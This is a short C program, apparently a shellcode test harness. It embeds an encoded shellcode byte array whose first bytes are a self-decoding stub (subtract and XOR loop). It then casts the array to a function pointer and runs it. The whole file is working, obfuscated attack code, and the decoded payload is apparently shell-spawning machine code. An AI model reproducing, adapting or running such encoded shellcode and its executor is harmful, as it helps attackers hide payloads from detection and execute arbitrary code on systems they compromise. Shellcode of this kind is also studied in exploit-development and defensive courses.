#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x10\x5e\x31\xc9\xb1\x19\x80\x2e\x0d\x80\x36\xaa\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xa8\x77\x07\xcf\x92\x92\xe6\xcf\xcf\x92\xd5\xd0\xd1\x30\x56\x07\x30\x55\x06\x30\x58\x27\xae\x74\x37";
int main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

